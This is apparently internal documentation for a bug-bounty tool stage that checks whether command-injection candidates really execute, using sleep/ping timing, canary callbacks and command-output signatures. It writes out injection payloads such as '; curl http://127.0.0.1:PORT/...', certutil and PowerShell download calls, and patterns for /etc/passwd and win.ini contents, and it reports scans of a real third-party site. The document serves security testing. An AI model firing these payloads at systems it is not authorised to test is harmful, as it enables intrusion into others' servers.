# RCE / command-injection VERIFICATION stage (0C-C2c)

Added 2026-10-10. Detection is not proof — this is the stage that answers
*"did the target actually RUN my command?"*

## The gap it closes

Before this stage the pipeline could **detect** a command-injection candidate but
never **verify execution**:

| what existed | what it actually proved |
|---|---|
| nuclei tag `cmd-injection,rce` | "the response matches a template pattern" — not that a shell ran |
| `cmdi-payloads.txt` (104 lines) | payload corpus, with nothing measuring the result |
| `"cmdi": ["gobuster","ffuf"]` | **nothing** — both are directory brute-forcers |

Measured proof of the third row: `tool-evidence/ffuf-cmdi.txt` on
`plugins.jetbrains.com` recorded

```
ffuf -u "https://plugins.jetbrains.com/FUZZ" -w sensitive-files-wordlist.txt
```

— a **file-name bruteforce wearing a `cmdi` label**. It fuzzes paths; it cannot put
a command into a parameter. An "cmdi" run through it returns 0 *by construction*.
The mapping is now `["nuclei", "rce-verify"]`.

## Three independent channels

```bash
python ~/.chiper/skills/bounty-pack/rce-verify.py <target-dir> <base-url> \
       [--param q] [--urls-file urls.txt] [--limit 12] [--sleep 5] \
       [--ratio 2.5] [--rounds 3] [--timeout 20] [--insecure]
```

Runs as **PHASE 0C-C2c**, between C2b (DOM-XSS) and C3 (business logic). Listed in
the `0C.tools` MANIFEST as `rce-verify`.

### 1. TIME-BASED — differential against a benign baseline
Send `; sleep N` / `| sleep N` / `$(sleep N)` **and** the Windows equivalents
(`& ping -n N+1 127.0.0.1`, `timeout /t N`). Baseline = median of 3 benign
requests. Fired when `delta >= max(baseline * ratio, sleep_n * 0.6)`.

A **floor of 0.6 × the requested sleep** is what makes a real pause register.
The first version used `sleep_n * ratio` as the threshold — with `sleep 3` and
`ratio 2.5` it demanded a 3.75 s delta, so a genuine 3.08 s hit read as `False`.
Measured before/after on the same target: `fired=False` → `fired=True`.

### 2. OUT-OF-BAND — canary callback
A local `HTTPServer` on `127.0.0.1:<free port>`; payloads embed
`; curl http://127.0.0.1:PORT/...`, `& certutil -urlcache -f http://...`,
`| powershell -c "iwr http://..."`. A callback arriving inside the test window is
**strong** evidence: the target's shell resolved our host and issued the request.
Captured verbatim (path, User-Agent, Host, POST body).

Measured callbacks on a vulnerable test target:
```
/rce-pipe       ua=curl/8.19.0
/rce-win-curl   ua=curl/8.19.0
/rce-win-iwr    ua=Mozilla/5.0 (Windows NT ...) WindowsPowerShell/5.1.19041.6456
```

### 3. OUTPUT-BASED — command stdout signature
Regexes for real command output: `uid=\d+\(...\)\s+gid=`, `root:.*?:0:0:`,
`[fonts]` (win.ini), `Windows IP Configuration`, service-account names.
Matched against inert **CONTROLS** first: if `; echo RCECTRL` also trips a
signature, the channel is declared noisy and must not be trusted.

## Verdict vocabulary

| verdict | meaning |
|---|---|
| `CONFIRMED` | OOB callback **or** output signature fired (direct evidence) |
| `PARTIAL_TIME_ONLY` | ≥2 time payloads fired, no OOB/output, controls clean → blind injection, reported as partial |
| `NOT_CONFIRMED` | no channel fired; the measurement is still written down |

A single weak signal never upgrades to `CONFIRMED`. A dirty control annotates the
verdict with a warning rather than silently passing it.

## UNIX **and** Windows payloads are mandatory

The shell differs by target. Measured on a Windows host: `; sleep 3` produced
**no** delay while `| sleep 3` produced 3.16 s and `& ping -n 4` produced 3.29 s.
A Unix-only payload set silently misses every IIS/ASP.NET host. `ping -n N` is the
Windows equivalent of `sleep N` (cmd.exe has no `sleep`).

## Verification performed (both directions, every channel)

| target | expected | observed |
|---|---|---|
| `/ping?host=` with `shell=True` (vulnerable) | CONFIRMED | **CONFIRMED** — 3 channels fired |
| `example.com/?q=test` (benign) | NOT_CONFIRMED | **NOT_CONFIRMED** — 0 channels |
| `/safe?q=` reflecting input, never executing | NOT_CONFIRMED | **NOT_CONFIRMED** — 0 channels |
| inert controls (`; echo RCECTRL`, `\| echo RCECTRL`) | silent | **silent** |

Channel detail on the vulnerable target:

```
TIME   : | sleep 3 (2.93s), & ping -n 4 (3.06s), | ping (3.34s), && ping (2.99s)
OOB    : /rce-pipe (curl/8.19.0), /rce-win-curl, /rce-win-iwr (PowerShell)
OUTPUT : unix-id-output, win-ini-content, ipconfig-output
```

The negative cases matter as much as the positive one: a verifier that only ever
says CONFIRMED is a false-positive machine.

## Pitfalls (all hit for real)

- **A `;` payload on a Windows target looks like a clean result.** It is not — the
  separator is wrong. Always run both families before concluding "not injectable".
- **`echo`-style reflection is not execution.** That is exactly what the inert
  controls detect; keep them and check them.
- **`shell=True` in the TEST TARGET is the vulnerability**, not a bug in the
  verifier — the local `vuln_server.py` deliberately uses it so the stage can be
  proven against a known-positive.
- **Never leave a silent failure.** If the stage throws, it writes
  `rce-verification.json` with `status: ERROR` and the exception text; the gate then
  sees an honest record instead of a missing file.
